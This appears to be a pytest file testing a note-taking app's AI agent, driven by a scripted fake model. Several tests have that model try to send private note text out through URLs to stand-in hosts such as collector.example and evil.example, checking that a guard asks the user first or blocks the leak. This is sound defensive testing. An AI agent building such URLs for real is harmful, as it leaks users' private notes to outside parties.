import asyncio
import json
import re
from dataclasses import replace
from types import MappingProxyType

import pytest

from app.services.agent.agent_loop import MAX_AGENT_TURNS
from app.services.agent.execution_errors import AgentExecutionError
from app.services.agent.inference import InferenceContextWindow
from app.services.agent.menu_actions import MenuResult, menu_action_store
from app.services.agent.prompt_settings import DEFAULT_AGENT_PROMPTS
from app.services.agent.retrieval_settings import AgentRetrievalSettings
from app.services.agent.scope import SelectedNoteContext, SelectedTreeNote
from app.services.agent.skill_settings import DEFAULT_AGENT_SKILLS
from app.services.agent.tool_calling import validate_tool_conversation
from app.services.agent.scope import NoteText
from app.services.agent.scope import TextExtractionMeter
from app.services.agent.web_actions import NoteTextGuard
from app.services.agent.web_evidence import web_evidence_store
from app.services.agent.web_fetch import WebPageFetchResult
from app.services.agent.web_settings import AgentWebSettings
from app.services.bulk_operation import bulk_operation_guard
from test_agent_scoped_runtime import _runtime, _snapshot


def _turn(text: str, calls: list[tuple[str, dict[str, object]]]) -> dict[str, object]:
    return {"text": text, "calls": calls}


class _ScriptedModel:
    """Plays scripted tool turns and records every conversation it was sent."""

    provider_label = "OpenAI"

    def __init__(self, turns: list[dict[str, object]]) -> None:
        self.turns = list(turns)
        self.conversations: list[list[dict[str, object]]] = []
        self.tool_names: list[tuple[str, ...]] = []

    async def inspect_context_window(self, *, base_url, model) -> InferenceContextWindow:
        del base_url
        return InferenceContextWindow(model=model, maximum_tokens=1_000_000, loaded_tokens=1_000_000,
                                      required_tokens=32_768)

    async def stream_tool_turn(self, *, base_url, model, thinking_level, messages, tools,
                               max_output_tokens, on_request):
        del base_url, model, thinking_level, max_output_tokens
        validate_tool_conversation(messages)
        self.conversations.append([dict(message) for message in messages])
        self.tool_names.append(tuple(tool.name for tool in tools))
        on_request({"messages": len(messages)})
        turn = self.turns.pop(0)
        for chunk in turn["text"].split("|"):
            if chunk:
                yield {"type": "content_delta", "text": chunk}
        for index, (name, arguments) in enumerate(turn["calls"]):
            yield {"type": "tool_call", "id": f"call-{len(self.conversations)}-{index}", "name": name,
                   "arguments": json.dumps(arguments)}
        finish_reason = "stop"
        if turn["calls"]:
            finish_reason = "tool_calls"
        yield {"type": "done", "finish_reason": finish_reason, "usage": {"input_tokens": 10, "output_tokens": 5}}


class _StubTagging:
    def __init__(self) -> None:
        self.reviews: list[tuple[str, str, str]] = []

    async def stream_review(self, *, action, scope, tag_filter):
        self.reviews.append((action, scope, tag_filter))
        yield {"type": "bulk_complete", "changed": True}
        yield {"type": "content_delta", "text": "Accepted 2 tag proposals across 1 notes.",
               "reference_note_ids": [], "reference_web_ids": []}
        yield {"type": "done", "reference_note_ids": [], "reference_web_ids": [], "actions": []}


def _run_agent(model: _ScriptedModel, *, web_mode: str, message: str, tagging, on_event) -> list[dict[str, object]]:
    async def collect() -> list[dict[str, object]]:
        events = []
        async for event in _runtime(model).stream_agent(earlier_actions=[], 
            session_key="session-1", base_url="https://api.openai.com/v1", selected_model="gpt-5.6-sol",
            thinking_level="low", canonical_messages=[{"role": "user", "content": message}],
            prompts=DEFAULT_AGENT_PROMPTS, skills=DEFAULT_AGENT_SKILLS,
            retrieval_settings=AgentRetrievalSettings(max_page_approximate_tokens=50_000),
            web_settings=AgentWebSettings(mode=web_mode), frozen_scope=_snapshot(large_tail=False),
            tagging_run=tagging,
        ):
            events.append(event)
            on_event(event)
        return events

    return asyncio.run(collect())


def _ignore(event: dict[str, object]) -> None:
    del event


def _answer(events: list[dict[str, object]]) -> str:
    return "".join(event["text"] for event in events if event["type"] == "content_delta")


def _tool_results(conversation: list[dict[str, object]]) -> list[dict[str, object]]:
    return [json.loads(message["content"]) for message in conversation if message["role"] == "tool"]


def test_a_help_question_looks_up_help_then_answers_from_it() -> None:
    model = _ScriptedModel([
        _turn("", [("lookup_metalist_help", {"topics": ["releases"]})]),
        _turn("0.11.0 made |large namespaces faster.", []),
    ])
    events = _run_agent(model, web_mode="none", message="What's new in 0.11.0?", tagging=None, on_event=_ignore)
    assert _answer(events) == "0.11.0 made large namespaces faster."
    assert events[-1] == {"type": "done", "reference_note_ids": [], "reference_web_ids": [],
                          "actions": [{"tool": "lookup_metalist_help", "topics": ["releases"]}]}
    help_result = _tool_results(model.conversations[1])[0]
    assert "## 0.11.0" in help_result["topics"][0]["help"]
    # Web pages are not offered while web access is off; the instructions come first.
    assert "open_web_pages" not in model.tool_names[0]
    assert model.conversations[0][0]["content"].startswith("You are MetaList's assistant")
    assert model.conversations[0][-1] == {"role": "user", "content": "What's new in 0.11.0?"}


def test_notes_found_by_tools_become_citable_and_references_only_grow() -> None:
    model = _ScriptedModel([
        _turn("Let me check.", [("search_view_notes", {"query": "child_alpha"})]),
        _turn("Child alpha is here.[[child-a]]", []),
    ])
    events = _run_agent(model, web_mode="none", message="Where is child alpha?", tagging=None, on_event=_ignore)
    deltas = [event for event in events if event["type"] == "content_delta"]
    assert deltas[0]["reference_note_ids"] == []
    assert deltas[-1]["text"] == "\n\nChild alpha is here.[[child-a]]"
    assert deltas[-1]["reference_note_ids"] == ["root-a", "child-a"]
    assert events[-1]["reference_note_ids"] == ["root-a", "child-a"]
    statuses = [event["label"] for event in events if event["type"] == "action_status"]
    assert "Searched “child_alpha” · read 2 notes" in statuses


def test_a_rejected_tool_call_is_explained_back_and_the_model_can_recover() -> None:
    model = _ScriptedModel([
        _turn("", [("lookup_metalist_help", {"topics": ["nonsense"]})]),
        _turn("", [("lookup_metalist_help", {"topics": ["search"]})]),
        _turn("Use -tag to exclude a tag.", []),
    ])
    events = _run_agent(model, web_mode="none", message="How do I exclude a tag?", tagging=None, on_event=_ignore)
    assert "not accepted" in _tool_results(model.conversations[1])[0]["error"]
    assert _answer(events) == "Use -tag to exclude a tag."


def test_persistent_bad_tool_calls_end_with_an_answer_instead_of_an_error() -> None:
    model = _ScriptedModel([
        _turn("", [("no_such_tool", {})]),
        _turn("", [("no_such_tool", {})]),
        _turn("I could not look that up.", []),
    ])
    events = _run_agent(model, web_mode="none", message="Do something odd", tagging=None, on_event=_ignore)
    assert model.conversations[2][-1]["role"] == "system"
    assert "AGENT_STEP_LIMIT" in model.conversations[2][-1]["content"]
    assert _answer(events) == "I could not look that up."


def test_a_model_that_never_stops_calling_tools_is_stopped_at_the_step_limit() -> None:
    model = _ScriptedModel([_turn("", [("view_overview", {})]) for _ in range(MAX_AGENT_TURNS)])
    events = _run_agent(model, web_mode="none", message="Loop forever", tagging=None, on_event=_ignore)
    assert len(model.conversations) == MAX_AGENT_TURNS
    assert "stopped before finishing" in _answer(events)
    assert events[-1]["type"] == "done"


def test_a_menu_opens_without_asking_and_its_result_goes_back_to_the_model() -> None:
    model = _ScriptedModel([
        _turn("", [("open_menu", {"menu_id": "form.ai_agent_settings"})]),
        _turn("I opened AI agent settings.", []),
    ])

    def acknowledge(event: dict[str, object]) -> None:
        if event["type"] == "menu_open":
            menu_action_store.acknowledge(session_key="session-1", result=MenuResult(
                request_id=event["request_id"], status="opened", detail=""))

    events = _run_agent(model, web_mode="none", message="Open AI settings", tagging=None, on_event=acknowledge)
    assert [event["type"] for event in events].count("bulk_question") == 0
    assert _tool_results(model.conversations[1])[0]["status"] == "opened"


def test_a_tag_review_hands_the_turn_to_its_confirmed_operation() -> None:
    tagging = _StubTagging()
    model = _ScriptedModel([
        _turn("", [("propose_tag_review", {"action": "accept", "scope": "current_view", "tag_filter": ""})]),
    ])
    events = _run_agent(model, web_mode="none", message="Accept all proposals", tagging=tagging, on_event=_ignore)
    assert tagging.reviews == [("accept", "current_view", "")]
    assert _answer(events) == "Accepted 2 tag proposals across 1 notes."
    assert events[-1]["type"] == "done"
    assert len(model.conversations) == 1


def test_an_operation_mixed_with_other_calls_is_refused_and_not_run() -> None:
    tagging = _StubTagging()
    model = _ScriptedModel([
        _turn("", [("view_overview", {}),
                   ("propose_tag_review", {"action": "remove", "scope": "namespace", "tag_filter": "x"})]),
        _turn("I need you to confirm separately.", []),
    ])
    _run_agent(model, web_mode="none", message="Remove x everywhere", tagging=tagging, on_event=_ignore)
    assert tagging.reviews == []
    results = _tool_results(model.conversations[1])
    assert "must be called alone" in results[1]["error"]


def _fake_pages(urls_seen: list[list[str]], allows_target_seen: list):
    async def fake_fetch(urls, *, allows_target):
        urls_seen.append(list(urls))
        allows_target_seen.append(allows_target)
        return tuple(WebPageFetchResult(
            requested_url=url, final_url=url, status="ok", title="Results", content_text="Sunny",
            outgoing_links=(), fetched_at="2026-10-05T00:00:00+00:00", truncated=False, error_kind="",
        ) for url in urls)
    return fake_fetch


def _questions_answered(answer: str, questions: list):
    def on_event(event: dict[str, object]) -> None:
        if event["type"] == "bulk_question":
            questions.append(event)
            bulk_operation_guard.answer("session-1", event["question_id"], answer)
    return on_event


def test_full_web_mode_asks_before_an_address_carries_note_text_elsewhere(monkeypatch) -> None:
    urls_seen, guards = [], []
    monkeypatch.setattr("app.services.agent.web_actions.fetch_web_pages", _fake_pages(urls_seen, guards))
    model = _ScriptedModel([
        _turn("", [("read_view_notes", {"note_ids": []})]),
        _turn("", [("open_web_pages", {"urls": ["https://collector.example/?d=ROOT_ALPHA"]})]),
        _turn("I did not open it.", []),
    ])
    questions = []
    _run_agent(model, web_mode="full", message="Look up the weather", tagging=None,
               on_event=_questions_answered("no", questions))
    assert questions[0]["kind"] == "change_confirmation"
    assert questions[0]["items"] == ["https://collector.example/?d=ROOT_ALPHA"]
    assert "words from your notes" in questions[0]["label"]
    assert _tool_results(model.conversations[2])[1]["declined_urls"] == ["https://collector.example/?d=ROOT_ALPHA"]
    assert urls_seen == []


def test_an_approved_address_opens_but_redirects_cannot_carry_note_text(monkeypatch) -> None:
    urls_seen, guards = [], []
    monkeypatch.setattr("app.services.agent.web_actions.fetch_web_pages", _fake_pages(urls_seen, guards))
    model = _ScriptedModel([
        _turn("", [("read_view_notes", {"note_ids": []})]),
        _turn("", [("open_web_pages", {"urls": ["https://collector.example/?d=ROOT_ALPHA"]})]),
        _turn("Opened.", []),
    ])
    questions = []
    _run_agent(model, web_mode="full", message="Look up the weather", tagging=None,
               on_event=_questions_answered("yes", questions))
    assert urls_seen == [["https://collector.example/?d=ROOT_ALPHA"]]
    # The fetcher checks every redirect hop with the same guard.
    allows_target = guards[0]
    assert allows_target("https://collector.example/?d=ROOT_ALPHA")
    assert not allows_target("https://other.example/?d=CHILD_ALPHA")
    assert allows_target("https://other.example/weather")


@pytest.mark.parametrize("url", [
    "https://www.google.com/search?q=root_alpha+child_alpha",
    "https://www.google.com/finance/quote/IAU:NYSEARCA?hl=en",
    "https://example.org/markets/gold",
])
def test_searches_quotes_and_addresses_without_note_text_open_without_asking(monkeypatch, url) -> None:
    urls_seen, guards = [], []
    monkeypatch.setattr("app.services.agent.web_actions.fetch_web_pages", _fake_pages(urls_seen, guards))
    model = _ScriptedModel([
        _turn("", [("read_view_notes", {"note_ids": []})]),
        _turn("", [("open_web_pages", {"urls": [url]})]),
        _turn("Done.", []),
    ])
    questions = []
    events = _run_agent(model, web_mode="full", message="What is the gold price?", tagging=None,
                        on_event=_questions_answered("no", questions))
    assert questions == []
    assert len(urls_seen) == 1
    assert events[-1]["reference_web_ids"] != []


def test_note_text_guard_rules() -> None:
    guard = NoteTextGuard.build(
        note_text="Budget for Project Falcon", typed_text="Please check the falcon release notes",
        known_urls=frozenset({"https://example.com/budget/report"}), approved_urls=frozenset(),
    )
    # Typed words, words of addresses already seen, and address syntax are not private.
    assert guard.addresses_needing_confirmation(["https://news.example/falcon", "https://example.com/budget/x"]) == ()
    assert guard.addresses_needing_confirmation(["https://evil.example/?d=project"]) == ("https://evil.example/?d=project",)
    # Text hidden in the host name counts too, and Google only exempts search and quotes.
    assert guard.addresses_needing_confirmation(["https://project.evil.example/"]) != ()
    assert guard.addresses_needing_confirmation(["https://www.google.com/url?q=https://evil.example/?d=project"]) != ()
    assert guard.addresses_needing_confirmation(["https://www.google.com/search?q=project+falcon"]) == ()
    approved = NoteTextGuard.build(note_text="Budget for Project Falcon", typed_text="",
        known_urls=frozenset(), approved_urls=frozenset({"https://evil.example/?d=project"}))
    assert approved.allows("https://evil.example/?d=project")


def test_a_silent_ending_is_answered_after_one_reminder() -> None:
    model = _ScriptedModel([
        _turn("", [("view_overview", {})]),
        _turn("", []),
        _turn("Your view has 3 notes.", []),
    ])
    events = _run_agent(model, web_mode="none", message="How many notes?", tagging=None, on_event=_ignore)
    assert "AGENT_ANSWER_REQUIRED" in model.conversations[2][-1]["content"]
    assert _answer(events) == "Your view has 3 notes."


def test_a_model_that_stays_silent_after_the_reminder_is_reported() -> None:
    model = _ScriptedModel([_turn("", []), _turn("", [])])
    with pytest.raises(AgentExecutionError, match="without writing an answer"):
        _run_agent(model, web_mode="none", message="Hello", tagging=None, on_event=_ignore)



def test_a_selected_note_tree_over_the_evidence_limit_is_never_sent() -> None:
    model = _ScriptedModel([_turn("Hello", [])])
    snapshot = replace(_snapshot(large_tail=False), selected_note=SelectedNoteContext(
        "available", "child-a", (SelectedTreeNote("parent", "", "PARENT", ""),
            SelectedTreeNote("child-a", "parent", "LARGE " * 1000, ""))))

    async def collect() -> None:
        async for _event in _runtime(model).stream_agent(earlier_actions=[], 
            session_key="session-1", base_url="https://api.openai.com/v1", selected_model="gpt-5.6-sol",
            thinking_level="low", canonical_messages=[{"role": "user", "content": "Explain"}],
            prompts=DEFAULT_AGENT_PROMPTS, skills=DEFAULT_AGENT_SKILLS,
            retrieval_settings=AgentRetrievalSettings(max_page_approximate_tokens=500),
            web_settings=AgentWebSettings(mode="none"), frozen_scope=snapshot, tagging_run=None,
        ):
            pass

    with pytest.raises(AgentExecutionError, match="larger than the evidence limit"):
        asyncio.run(collect())
    assert model.conversations == []


def test_the_model_cites_short_web_tokens_and_the_chat_gets_full_ones(monkeypatch) -> None:
    async def fake_fetch(urls, *, allows_target):
        return tuple(WebPageFetchResult(
            requested_url=url, final_url=url, status="ok", title="Front page", content_text="Stories",
            outgoing_links=(("First story", "https://stories.example/first"),),
            fetched_at="2026-10-05T00:00:00+00:00", truncated=False, error_kind="",
        ) for url in urls)

    monkeypatch.setattr("app.services.agent.web_actions.fetch_web_pages", fake_fetch)
    web_evidence_store.clear_session(session_key="session-1")
    model = _ScriptedModel([_turn("", [("open_web_pages", {"urls": ["https://front.example/"]})])])
    # The model reads the short tokens from the page result, then cites them split across chunks.
    original = model.stream_tool_turn

    async def citing_turn(**kwargs):
        if len(model.conversations) == 1:
            page = _tool_results(kwargs["messages"])[0]["pages"][0]
            story_token = page["outgoing_link_references"][0]["citation_token"]
            model.turns.append(_turn(f"1. **First story**{story_token[:4]}|{story_token[4:]} [[web:999]]", []))
        async for event in original(**kwargs):
            yield event

    monkeypatch.setattr(model, "stream_tool_turn", citing_turn)
    events = _run_agent(model, web_mode="full", message="Show the stories", tagging=None, on_event=_ignore)
    text = _answer(events)
    story = next(reference for page in web_evidence_store.evidence(session_key="session-1")
                 for reference in page.outgoing_references)
    assert text == f"1. **First story**[[web:{story.evidence_id}]] "
    assert story.evidence_id in events[-1]["reference_web_ids"]


def test_summarizing_an_empty_view_asks_nothing_and_says_so(monkeypatch) -> None:
    empty = replace(_snapshot(large_tail=False), ordered_root_ids=(), ordered_note_ids=(),
                    notes_by_id=MappingProxyType({}), tree_nodes_by_id=MappingProxyType({}))
    model = _ScriptedModel([_turn("", [("summarize_view", {"continues_failed_summary": False})]), _turn("This view has no notes to summarize.", [])])

    async def collect():
        return [event async for event in _runtime(model).stream_agent(earlier_actions=[], 
            session_key="session-1", base_url="https://api.openai.com/v1", selected_model="gpt-5.6-sol",
            thinking_level="low", canonical_messages=[{"role": "user", "content": "Summarize my notes."}],
            prompts=DEFAULT_AGENT_PROMPTS, skills=DEFAULT_AGENT_SKILLS,
            retrieval_settings=AgentRetrievalSettings(max_page_approximate_tokens=50_000),
            web_settings=AgentWebSettings(mode="none"), frozen_scope=empty, tagging_run=None,
        )]

    events = asyncio.run(collect())
    assert [event for event in events if event["type"] == "bulk_question"] == []
    assert _tool_results(model.conversations[1])[0]["reason"] == "The current view has no notes to summarize."
    assert _answer(events) == "This view has no notes to summarize."


def test_contextual_mode_tells_the_model_which_note_addresses_it_may_now_open(monkeypatch) -> None:
    notes = dict(_snapshot(large_tail=False).notes_by_id)
    notes["child-a"] = replace(notes["child-a"], note_text=NoteText.from_text("Report at https://soil.example/report"))
    snapshot = replace(_snapshot(large_tail=False), notes_by_id=MappingProxyType(notes))
    model = _ScriptedModel([_turn("", [("read_view_notes", {"note_ids": ["child-a"]})]), _turn("Done.", [])])

    async def collect():
        return [event async for event in _runtime(model).stream_agent(earlier_actions=[], 
            session_key="session-1", base_url="https://api.openai.com/v1", selected_model="gpt-5.6-luna",
            thinking_level="low", canonical_messages=[{"role": "user", "content": "Open my report link"}],
            prompts=DEFAULT_AGENT_PROMPTS, skills=DEFAULT_AGENT_SKILLS,
            retrieval_settings=AgentRetrievalSettings(max_page_approximate_tokens=50_000),
            web_settings=AgentWebSettings(mode="contextual"), frozen_scope=snapshot, tagging_run=None,
        )]

    asyncio.run(collect())
    assert _tool_results(model.conversations[1])[0]["web_addresses_now_openable"] == ["https://soil.example/report"]


def test_the_model_sees_and_cites_short_note_aliases_and_the_chat_gets_full_ids() -> None:
    # Tool results and the selected-note context carry n1, n2…; aliases in tool
    # arguments are translated back; [[n2]] citations become full note ids.
    model = _ScriptedModel([_turn("", [("read_view_notes", {"note_ids": ["n2"]})])])
    original = model.stream_tool_turn

    async def cite_second_read(**kwargs):
        if len(model.conversations) == 1:
            trees = _tool_results(kwargs["messages"])[0]["trees"]
            child = trees[0]["children"][0]["note_id"]
            model.turns.append(_turn(f"Child alpha.[[{child[:2]}|{child[2:]}]]", []))
        async for event in original(**kwargs):
            yield event

    model.stream_tool_turn = cite_second_read
    events = _run_agent(model, web_mode="none", message="Read the child note", tagging=None, on_event=_ignore)
    result = _tool_results(model.conversations[1])[0]
    assert result["trees"][0]["note_id"] == "n1" and result["trees"][0]["children"][0]["note_id"] == "n2"
    assert "root-a" not in json.dumps(result) and "child-a" not in json.dumps(result)
    assert _answer(events) == "Child alpha.[[child-a]]"
    assert events[-1]["reference_note_ids"] == ["root-a", "child-a"]


def test_the_model_sees_its_record_of_earlier_answers() -> None:
    earlier = [{"answer": 1, "question": "Find recent papers", "actions": [
        {"tool": "open_web_pages", "pages": [
            {"url": "https://www.google.com/search?q=ssm", "status": "ok", "title": "Google Search"}]}]}]
    model = _ScriptedModel([_turn("Yes, I searched Google for ssm.", [])])

    async def collect(earlier_actions):
        return [event async for event in _runtime(model).stream_agent(
            earlier_actions=earlier_actions,
            session_key="session-1", base_url="https://api.openai.com/v1", selected_model="gpt-5.6-sol",
            thinking_level="low", canonical_messages=[
                {"role": "user", "content": "Find recent papers"},
                {"role": "assistant", "content": "Here are some."},
                {"role": "user", "content": "Did you search the web?"}],
            prompts=DEFAULT_AGENT_PROMPTS, skills=DEFAULT_AGENT_SKILLS,
            retrieval_settings=AgentRetrievalSettings(max_page_approximate_tokens=50_000),
            web_settings=AgentWebSettings(mode="full"), frozen_scope=_snapshot(large_tail=False),
            tagging_run=None,
        )]

    events = asyncio.run(collect(earlier))
    record = [message["content"] for message in model.conversations[0]
              if isinstance(message["content"], str) and message["content"].startswith("EARLIER_ACTIONS\n")]
    assert len(record) == 1
    assert json.loads(record[0].split("\n", 1)[1])["answers"] == earlier
    # The current question stays last; this answer's own (empty) log ends the run.
    assert model.conversations[0][-1] == {"role": "user", "content": "Did you search the web?"}
    assert events[-1]["actions"] == []

    model.turns.append(_turn("No record.", []))
    asyncio.run(collect([]))
    assert not any(isinstance(message["content"], str) and message["content"].startswith("EARLIER_ACTIONS")
                   for message in model.conversations[1])


def test_each_model_turn_waits_for_the_provider_until_its_first_signal() -> None:
    # The chat shows "Waiting for OpenAI" from the request until the first event,
    # so a stalled network does not look like thinking.
    model = _ScriptedModel([_turn("", [("lookup_metalist_help", {"topics": ["releases"]})]), _turn("Here is what's new.", [])])

    events = _run_agent(model, web_mode="none", message="What's new in MetaList?", tagging=None, on_event=lambda event: None)

    steps = [(event["action"], event["status"], event["label"]) for event in events if event["type"] == "action_status"
             and event["action"] in {"agent_turn", "provider_wait"}]
    waits = [step for step in steps if step[0] == "provider_wait"]
    assert waits == [
        ("provider_wait", "started", "Waiting for OpenAI"), ("provider_wait", "completed", "OpenAI responded"),
        ("provider_wait", "started", "Waiting for OpenAI"), ("provider_wait", "completed", "OpenAI responded"),
    ]
    # The wait ends before the turn's answer text arrives.
    first_content = next(index for index, event in enumerate(events) if event["type"] == "content_delta")
    last_wait_completed = max(index for index, event in enumerate(events) if event["type"] == "action_status"
                              and event["action"] == "provider_wait" and event["status"] == "completed")
    assert last_wait_completed < first_content


def _html_backed_snapshot():
    # Notes whose text is extracted on first read, as in a real frozen scope.
    base = _snapshot(large_tail=False)
    meter = TextExtractionMeter.start()
    notes = {
        note_id: replace(note, note_text=NoteText.from_html(
            content_html=f"<p>{note.content_text}</p>", tags_text=note.explicit_tags_text, meter=meter))
        for note_id, note in base.notes_by_id.items()
    }
    return replace(base, notes_by_id=MappingProxyType(notes), text_extraction=meter)


def test_a_tool_that_extracts_note_text_says_how_much_on_its_line() -> None:
    snapshot = _html_backed_snapshot()
    model = _ScriptedModel([
        _turn("", [("search_view_notes", {"query": "child_alpha"})]),
        _turn("", [("search_view_notes", {"query": "child_alpha"})]),
        _turn("Found it.", []),
    ])

    async def collect():
        return [event async for event in _runtime(model).stream_agent(earlier_actions=[],
            session_key="session-1", base_url="https://api.openai.com/v1", selected_model="gpt-5.6-luna",
            thinking_level="low", canonical_messages=[{"role": "user", "content": "Find child alpha"}],
            prompts=DEFAULT_AGENT_PROMPTS, skills=DEFAULT_AGENT_SKILLS,
            retrieval_settings=AgentRetrievalSettings(max_page_approximate_tokens=50_000),
            web_settings=AgentWebSettings(mode="none"), frozen_scope=snapshot, tagging_run=None,
        )]

    events = asyncio.run(collect())
    searches = [str(event["label"]) for event in events if event["type"] == "action_status"
                and event["action"] == "search_view_notes" and event["status"] == "completed"]
    note_count = len(snapshot.ordered_note_ids)
    # The first search extracts every note's text; the second reuses it and says nothing.
    assert re.search(rf" · text extracted for {note_count} notes in (\d+ ms|\d+\.\d s)$", searches[0])
    assert "text extracted" not in searches[1]
